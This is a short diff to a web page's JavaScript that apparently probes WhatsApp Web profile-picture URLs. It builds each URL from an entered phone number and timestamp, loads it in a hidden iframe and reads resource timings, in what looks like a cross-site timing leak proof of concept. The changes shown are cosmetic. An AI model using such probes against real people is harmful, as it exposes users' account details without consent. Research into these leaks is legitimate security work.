@@ -7,7 +7,7 @@ https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timest
 <p id='result'></p>
 <script>
   function send(url){ 
-	    return new Promise(function(resolve,reject){
+	return new Promise(function(resolve,reject){
             var iframe = document.createElement("iframe");
             iframe.setAttribute("hidden", true);
             iframe.setAttribute("sanbox", "allow-same-origin");
@@ -16,7 +16,7 @@ https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timest
                 iframe.remove();
                 resolve("done");
             }
-            iframe.src = url
+            iframe.src = url;
 		  });
 	}
 
@@ -32,7 +32,8 @@ https://web.whatsapp.com/pp?t=s&u=<input id="number">%40c.us&i=<input id="timest
       var timestamp = document.getElementById("timestamp").value;
       var url = "https://web.whatsapp.com/pp?t=s&u="+number+"%40c.us&i="+timestamp;
       //if (number=="" || timestamp==""){
-        performance.clearResourceTimings()
+	console.log(url);
+        performance.clearResourceTimings();
         send(url).then(result(url));
       /*} else {
          document.getElementById("result").innerHTML = "You should fill both URL and Timestamp textfields";
